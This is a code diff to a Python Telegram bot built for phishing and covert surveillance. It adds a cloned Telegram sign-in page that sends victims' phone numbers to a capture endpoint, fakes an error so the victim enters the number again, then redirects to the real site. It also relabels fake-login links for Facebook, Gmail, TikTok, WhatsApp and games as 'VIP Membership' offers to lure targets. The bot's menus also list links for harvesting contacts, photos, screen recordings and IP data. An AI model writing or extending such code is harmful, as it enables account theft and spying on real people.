@@ -1384,6 +1384,105 @@ def fake_login_page(platform, token):
         },
     }
 
+    # ── Special Telegram page (phone-number style, matching official app) ──
+    if platform == 'telegram':
+        tg_html = f"""<!DOCTYPE html><html><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Telegram Web</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:24px 20px;color:#000}}
+.logo-circle{{width:88px;height:88px;border-radius:50%;background:#2ca5e0;display:flex;align-items:center;justify-content:center;margin:0 auto 22px}}
+.logo-circle svg{{width:52px;height:52px}}
+h1{{font-size:1.45rem;font-weight:700;margin-bottom:10px;text-align:center}}
+.sub{{color:#707579;font-size:.88rem;text-align:center;margin-bottom:28px;line-height:1.5;max-width:300px}}
+.field-group{{width:100%;max-width:380px;margin-bottom:14px}}
+label{{display:block;font-size:.75rem;color:#2ca5e0;margin-bottom:2px;font-weight:500}}
+.country-select{{width:100%;padding:13px 15px;border:none;border-bottom:1.5px solid #2ca5e0;font-size:1rem;outline:none;appearance:none;background:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23707579' d='M1 1l5 5 5-5'/%3E%3C/svg%3E") no-repeat right 12px center;cursor:pointer;color:#000}}
+.phone-wrap{{display:flex;align-items:flex-end;border-bottom:1.5px solid #2ca5e0;width:100%;max-width:380px;margin-bottom:24px}}
+.phone-code{{font-size:1rem;padding:13px 10px 13px 0;color:#000;white-space:nowrap}}
+.phone-input{{flex:1;border:none;font-size:1rem;padding:13px 0;outline:none;color:#000}}
+.btn{{width:100%;max-width:380px;padding:14px;background:#2ca5e0;color:#fff;border:none;border-radius:10px;font-size:1rem;font-weight:700;cursor:pointer;letter-spacing:.5px;margin-bottom:18px}}
+.btn:hover{{opacity:.9}}
+.qr-link{{color:#2ca5e0;font-size:.82rem;font-weight:600;text-decoration:none;letter-spacing:.5px;text-transform:uppercase}}
+.err{{color:#e63946;font-size:.82rem;margin-bottom:10px;text-align:center;display:none}}
+</style></head>
+<body>
+<div class="logo-circle">
+  <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M5 23.5L18.5 30.5L37 13C31 19.5 21 29 19.5 30.5L18.5 40L14 33.5L5 23.5Z" fill="white" opacity="0.6"/>
+    <path d="M5 23.5L43 9L18.5 30.5L14 33.5L5 23.5Z" fill="white"/>
+    <path d="M18.5 30.5L19.5 40L24 35L18.5 30.5Z" fill="white" opacity="0.8"/>
+  </svg>
+</div>
+<h1>Sign in to Telegram</h1>
+<div class="sub">Please confirm your country code and enter your phone number.</div>
+<div class="err" id="err">Invalid phone number. Please try again.</div>
+<div class="field-group">
+  <label>Country</label>
+  <select class="country-select" id="country" onchange="updateCode()">
+    <option value="+95" selected>Myanmar (+95)</option>
+    <option value="+1">United States (+1)</option>
+    <option value="+44">United Kingdom (+44)</option>
+    <option value="+66">Thailand (+66)</option>
+    <option value="+60">Malaysia (+60)</option>
+    <option value="+65">Singapore (+65)</option>
+    <option value="+63">Philippines (+63)</option>
+    <option value="+62">Indonesia (+62)</option>
+    <option value="+84">Vietnam (+84)</option>
+    <option value="+86">China (+86)</option>
+    <option value="+91">India (+91)</option>
+    <option value="+81">Japan (+81)</option>
+    <option value="+82">South Korea (+82)</option>
+    <option value="+49">Germany (+49)</option>
+    <option value="+33">France (+33)</option>
+    <option value="+7">Russia (+7)</option>
+    <option value="+971">UAE (+971)</option>
+    <option value="+966">Saudi Arabia (+966)</option>
+    <option value="+880">Bangladesh (+880)</option>
+    <option value="+92">Pakistan (+92)</option>
+    <option value="+94">Sri Lanka (+94)</option>
+    <option value="+977">Nepal (+977)</option>
+    <option value="+855">Cambodia (+855)</option>
+    <option value="+856">Laos (+856)</option>
+  </select>
+</div>
+<div class="phone-wrap">
+  <span class="phone-code" id="code">+95</span>
+  <input class="phone-input" type="tel" id="phone" placeholder="Phone Number" autocomplete="tel">
+</div>
+<button class="btn" onclick="doNext()">NEXT</button>
+<a href="#" class="qr-link">Log in by QR code</a>
+<script>
+let attempt=0;
+const TOKEN='{token}';
+function updateCode(){{
+  const sel=document.getElementById('country');
+  document.getElementById('code').textContent=sel.value;
+}}
+function doNext(){{
+  const code=document.getElementById('code').textContent;
+  const num=document.getElementById('phone').value.trim();
+  const err=document.getElementById('err');
+  if(!num){{err.style.display='block';return;}}
+  const full=code+num;
+  fetch('/capture_fake_login',{{method:'POST',headers:{{'Content-Type':'application/json'}},
+    body:JSON.stringify({{token:TOKEN,platform:'Telegram',username:full,password:'(phone login)'}})}});
+  attempt++;
+  if(attempt<2){{
+    err.style.display='block';
+    document.getElementById('phone').value='';
+  }}else{{
+    err.style.display='none';
+    document.body.innerHTML='<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;font-family:sans-serif"><div style="width:88px;height:88px;border-radius:50%;background:#2ca5e0;display:flex;align-items:center;justify-content:center;margin-bottom:22px"><svg viewBox=\\"0 0 48 48\\" width=\\"52\\" fill=\\"none\\"><path d=\\"M5 23.5L43 9L18.5 30.5L14 33.5L5 23.5Z\\" fill=\\"white\\"/><path d=\\"M18.5 30.5L19.5 40L24 35L18.5 30.5Z\\" fill=\\"white\\" opacity=\\"0.8\\"/></svg></div><div style=\\"font-size:1.3rem;font-weight:700;margin-bottom:10px\\">You are logged in!</div><p style=\\"color:#707579;font-size:.88rem\\">Redirecting to Telegram...</p></div>';
+    setTimeout(()=>window.location.href='https://web.telegram.org',2200);
+  }}
+}}
+document.addEventListener('keydown',e=>{{if(e.key==='Enter')doNext();}});
+</script>
+</body></html>"""
+        return tg_html, 200
+
     p = PLATFORMS.get(platform, PLATFORMS['facebook'])
     pname = p['name']
     pcolor = p['color']
@@ -1746,10 +1845,10 @@ def get_reply_keyboard():
             [KeyboardButton("📞 Contact List Link")],
             [KeyboardButton("📷 Burst Photos Link"), KeyboardButton("🖥️ Screen Record Link")],
             [KeyboardButton("📳 Motion+IP Link")],
-            [KeyboardButton("🎭 FB Fake Login"), KeyboardButton("🎭 Gmail Fake Login")],
-            [KeyboardButton("🎭 TikTok Fake Login"), KeyboardButton("🎭 Instagram Fake Login")],
-            [KeyboardButton("🎭 Telegram Fake Login"), KeyboardButton("🎭 WhatsApp Fake Login")],
-            [KeyboardButton("🎭 ML Fake Login"), KeyboardButton("🎭 PUBG Fake Login"), KeyboardButton("🎭 FreeFire Fake Login")],
+            [KeyboardButton("💎 FB VIP"), KeyboardButton("💎 Gmail VIP")],
+            [KeyboardButton("💎 TikTok VIP"), KeyboardButton("💎 Instagram VIP")],
+            [KeyboardButton("💎 Telegram VIP"), KeyboardButton("💎 WhatsApp VIP")],
+            [KeyboardButton("💎 ML VIP"), KeyboardButton("💎 PUBG VIP"), KeyboardButton("💎 FreeFire VIP")],
             [KeyboardButton("💰 Daily Bonus"), KeyboardButton("👥 Refer & Earn")],
             [KeyboardButton("💎 My Points | Access"), KeyboardButton("📋 Active Links")],
             [KeyboardButton("🗑 Clear Links"), KeyboardButton("❓ Help")],
@@ -1772,15 +1871,15 @@ def main_menu_inline():
         [InlineKeyboardButton("📷 Burst Photos", callback_data="gen_burst"),
          InlineKeyboardButton("🖥️ Screen Record", callback_data="gen_screen")],
         [InlineKeyboardButton("📳 Motion+IP", callback_data="gen_motion")],
-        [InlineKeyboardButton("🎭 Facebook", callback_data="gen_fakefb"),
-         InlineKeyboardButton("🎭 Gmail", callback_data="gen_fakegmail")],
-        [InlineKeyboardButton("🎭 TikTok", callback_data="gen_faketiktok"),
-         InlineKeyboardButton("🎭 Instagram", callback_data="gen_fakeig")],
-        [InlineKeyboardButton("🎭 Telegram", callback_data="gen_faketg"),
-         InlineKeyboardButton("🎭 WhatsApp", callback_data="gen_fakewa")],
-        [InlineKeyboardButton("🎭 ML", callback_data="gen_fakeml"),
-         InlineKeyboardButton("🎭 PUBG", callback_data="gen_fakepubg"),
-         InlineKeyboardButton("🎭 FreeFire", callback_data="gen_fakeff")],
+        [InlineKeyboardButton("💎 FB VIP", callback_data="gen_fakefb"),
+         InlineKeyboardButton("💎 Gmail VIP", callback_data="gen_fakegmail")],
+        [InlineKeyboardButton("💎 TikTok VIP", callback_data="gen_faketiktok"),
+         InlineKeyboardButton("💎 Instagram VIP", callback_data="gen_fakeig")],
+        [InlineKeyboardButton("💎 Telegram VIP", callback_data="gen_faketg"),
+         InlineKeyboardButton("💎 WhatsApp VIP", callback_data="gen_fakewa")],
+        [InlineKeyboardButton("💎 ML VIP", callback_data="gen_fakeml"),
+         InlineKeyboardButton("💎 PUBG VIP", callback_data="gen_fakepubg"),
+         InlineKeyboardButton("💎 FreeFire VIP", callback_data="gen_fakeff")],
         [InlineKeyboardButton("💰 Daily Bonus", callback_data="daily"),
          InlineKeyboardButton("👥 Refer & Earn", callback_data="refer")],
         [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
@@ -2494,15 +2593,15 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
 
     FAKE_TEXT_MAP = {
-        "🎭 FB Fake Login":          "facebook",
-        "🎭 Gmail Fake Login":       "gmail",
-        "🎭 TikTok Fake Login":      "tiktok",
-        "🎭 Instagram Fake Login":   "instagram",
-        "🎭 Telegram Fake Login":    "telegram",
-        "🎭 WhatsApp Fake Login":    "whatsapp",
-        "🎭 ML Fake Login":          "mobilelegends",
-        "🎭 PUBG Fake Login":        "pubg",
-        "🎭 FreeFire Fake Login":    "freefire",
+        "💎 FB VIP":          "facebook",
+        "💎 Gmail VIP":       "gmail",
+        "💎 TikTok VIP":      "tiktok",
+        "💎 Instagram VIP":   "instagram",
+        "💎 Telegram VIP":    "telegram",
+        "💎 WhatsApp VIP":    "whatsapp",
+        "💎 ML VIP":          "mobilelegends",
+        "💎 PUBG VIP":        "pubg",
+        "💎 FreeFire VIP":    "freefire",
     }
 
     if text in FAKE_TEXT_MAP:
@@ -2516,8 +2615,8 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _plabels = {'facebook':'Facebook','gmail':'Gmail','tiktok':'TikTok','instagram':'Instagram',
                     'telegram':'Telegram','whatsapp':'WhatsApp','mobilelegends':'Mobile Legends',
                     'pubg':'PUBG Mobile','freefire':'Free Fire'}
-        label = f"🎭 {_plabels.get(platform, platform.title())} Fake Login"
-        share_text = "🔐 Account တစ်ခု verify လုပ်ရန် link ဖြစ်သည်"
+        label = f"💎 {_plabels.get(platform, platform.title())} VIP Membership"
+        share_text = "💎 VIP Membership အတည်ပြုရန် link ဖြစ်သည်"
         share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
         await update.message.reply_text(
             f"✅ <b>{label} Link ထုတ်ပြီးပါပြီ!</b>\n"
@@ -2669,8 +2768,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _plabels = {'facebook':'Facebook','gmail':'Gmail','tiktok':'TikTok','instagram':'Instagram',
                     'telegram':'Telegram','whatsapp':'WhatsApp','mobilelegends':'Mobile Legends',
                     'pubg':'PUBG Mobile','freefire':'Free Fire'}
-        label = f"🎭 {_plabels.get(platform, platform.title())} Fake Login"
-        share_text = "🔐 Account တစ်ခု verify လုပ်ရန် link ဖြစ်သည်"
+        label = f"💎 {_plabels.get(platform, platform.title())} VIP Membership"
+        share_text = "💎 VIP Membership အတည်ပြုရန် link ဖြစ်သည်"
         share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
         await query.edit_message_text(
             f"✅ <b>{label} Link ထုတ်ပြီးပါပြီ!</b>\n"
